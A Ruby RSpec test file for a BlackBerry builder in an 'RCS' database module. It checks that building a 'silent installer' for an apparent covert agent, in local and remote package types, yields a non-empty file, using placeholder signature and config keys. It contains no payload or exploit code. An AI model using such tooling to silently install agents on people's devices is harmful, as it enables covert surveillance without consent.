require 'spec_helper'
require 'fileutils'

require_db 'db_layer'
require_db 'grid'
require_db 'build'
require_db 'core'

require_relative 'shared'

module RCS::DB
  describe BuildBlackberry, build: true do

    shared_spec_for(:blackberry)

    before(:all) do
      RCS::DB::Config.instance.load_from_file

      @signature = ::Signature.create!(scope: 'agent', value: 'A'*32)

      @factory = Item.create!(name: 'testfactory', _kind: :factory, path: [], stat: ::Stat.new, good: true).tap do |f|
        f.update_attributes logkey: 'L'*32, confkey: 'C'*32, ident: 'RCS_000000test', seed: '88888888.333'
        f.configs << Configuration.new({config: 'test_config'})
      end
    end

    describe 'Blackberry builder' do
      it 'should create the silent installer (local)' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {},
          'package' => {'type' => 'local'}
        }

        subject.create(params)

        expect(File.size(subject.path(subject.outputs.first))).not_to eql(0)
      end

      it 'should create the silent installer (remote)' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {},
          'package' => {'type' => 'remote'}
        }

        subject.create(params)

        expect(File.size(subject.path(subject.outputs.first))).not_to eql(0)
      end
    end
  end
end
